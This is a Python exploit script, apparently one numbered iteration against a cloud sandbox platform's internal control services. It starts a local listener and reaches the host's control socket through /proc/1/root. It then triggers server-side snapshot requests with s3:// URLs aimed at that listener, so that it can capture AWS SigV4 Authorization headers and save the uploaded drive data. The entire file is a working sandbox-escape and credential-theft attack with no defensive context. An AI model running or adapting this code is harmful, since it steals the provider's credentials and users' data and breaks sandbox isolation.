# -*- coding: utf-8 -*-
"""v192 payload (guest): s3:// scheme SSRF + 凭据提取验证
1. 监听 18081 接收 S3 请求 (记录 Authorization 头 = SigV4 AccessKey)
2. CreateSnapshot driveId 变体 baseUrl=s3://127.0.0.1:18081/bucket
3. sandboxctrl CreateSnapshot bucketBaseUrl=s3://...
输出 /vercel/sandbox/v192c.out"""
import socket, time, json, os, signal, threading

OUT = '/vercel/sandbox/v192c.out'
f = open(OUT, 'w', encoding='utf-8', errors='replace')
signal.alarm(240)

RECV = []
LOCK = threading.Lock()


def log(s, maxlen=4200):
    s = str(s)
    if len(s) > maxlen:
        s = s[:maxlen] + '...[TRUNC %d]' % len(s)
    line = '[%.1f] %s' % (time.time(), s)
    try:
        f.write(line + '\n')
        f.flush()
    except Exception:
        pass
    print(line, flush=True)


def punix(sp, path, body, t=10):
    b = json.dumps(body).encode()
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect(sp)
        hdrs = 'POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: application/json\r\n' % path
        hdrs += 'Connect-Protocol-Version: 1\r\nContent-Length: %d\r\nConnection: close\r\n\r\n' % len(b)
        s.sendall(hdrs.encode() + b)
        d = b''
        try:
            while True:
                c = s.recv(65536)
                if not c:
                    break
                d += c
                if len(d) > 8000:
                    break
        except Exception:
            pass
        s.close()
        st = d.split(b'\r\n', 1)[0].decode(errors='replace') if d else 'NO_RESP'
        return st, d[:6000]
    except Exception as e:
        return 'EXC %s' % type(e).__name__, b''


def post(ip, port, path, body, t=10):
    b = json.dumps(body).encode()
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect((ip, port))
        hdrs = 'POST %s HTTP/1.1\r\nHost: x\r\nContent-Type: application/json\r\n' % path
        hdrs += 'Connect-Protocol-Version: 1\r\nContent-Length: %d\r\nConnection: close\r\n\r\n' % len(b)
        s.sendall(hdrs.encode() + b)
        d = b''
        try:
            while True:
                c = s.recv(65536)
                if not c:
                    break
                d += c
                if len(d) > 8000:
                    break
        except Exception:
            pass
        s.close()
        st = d.split(b'\r\n', 1)[0].decode(errors='replace') if d else 'NO_RESP'
        return st, d[:6000]
    except Exception as e:
        return 'EXC %s' % type(e).__name__, b''


# ============ 1: S3 监听器 ============
log('=== 1 listener ===')
def listener():
    try:
        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind(('0.0.0.0', 18081))
        srv.listen(20)
        srv.settimeout(1)
        log('LISTENER UP')
        end = time.time() + 110
        while time.time() < end:
            try:
                c, a = srv.accept()
            except socket.timeout:
                continue
            c.settimeout(4)
            try:
                d = b''
                while True:
                    x = c.recv(65536)
                    if not x:
                        break
                    d += x
                    if len(d) > 3000000:
                        break
            except Exception:
                pass
            try:
                c.sendall(b'HTTP/1.1 200 OK\r\nContent-Length: 2\r\nConnection: close\r\n\r\n{}')
            except Exception:
                pass
            c.close()
            with LOCK:
                RECV.append((a, d))
                log('RECV from %s %d bytes' % (a, len(d)))
                # 提取 SigV4 Authorization
                for line in d.split(b'\r\n'):
                    if line[:16].lower() == b'authorization: ':
                        log('AUTH: %r' % line[:600])
                    if line[:8].lower() == b'amz-sdk' or line[:12].lower() == b'x-amz-date':
                        log('HDR: %r' % line[:300])
        srv.close()
    except Exception as e:
        log('LISTENER EXC %s' % e)


t = threading.Thread(target=listener, daemon=True)
t.start()
time.sleep(1)

CELL = '/proc/1/root/run/cell/cell.sock'
DR = 'vercel.hive.cell.api.drives.v1.DrivesService'
CTRL = 'vercel.sandbox.api.controller.v1.ControllerService'

# ============ 2: cell.sock s3:// ============
log('=== 2 cell s3 snapshots ===')
for did, tag in [('sandbox', 's1'), ('vda', 's2'), ('vdb', 's3')]:
    st, pay = punix(CELL, '/' + DR + '/CreateSnapshot',
                    {'driveId': did, 'baseUrl': 's3://127.0.0.1:18081/snap/%s' % tag}, t=12)
    log('CELL S3 %s -> %s %r' % (did, st, pay[:600]))
    time.sleep(2)

# ============ 3: sandboxctrl s3:// ============
log('=== 3 ctrl s3 snapshots ===')
for did, tag in [('sandbox', 'c1'), ('vda', 'c2')]:
    st, pay = post('127.0.0.1', 23456, '/' + CTRL + '/CreateSnapshot',
                   {'driveId': did, 'bucketBaseUrl': 's3://127.0.0.1:18081/snap/%s' % tag}, t=12)
    log('CTRL S3 %s -> %s %r' % (did, st, pay[:600]))
    time.sleep(2)

# ============ 4: 汇总 ============
log('=== 4 summary ===')
time.sleep(6)
with LOCK:
    log('TOTAL RECV %d' % len(RECV))
    for i, (a, d) in enumerate(RECV):
        log('R%d %s %d bytes: %r' % (i, a, len(d), d[:500]))
        try:
            hb = d.split(b'\r\n\r\n', 1)
            if len(hb) > 1 and len(hb[1]) > 100:
                fn = '/vercel/sandbox/v192up%d.bin' % i
                open(fn, 'wb').write(hb[1])
                log('SAVED %s %d bytes' % (fn, len(hb[1])))
        except Exception as e:
            log('SAVE EXC %s' % e)

log('V192_DONE')
f.close()
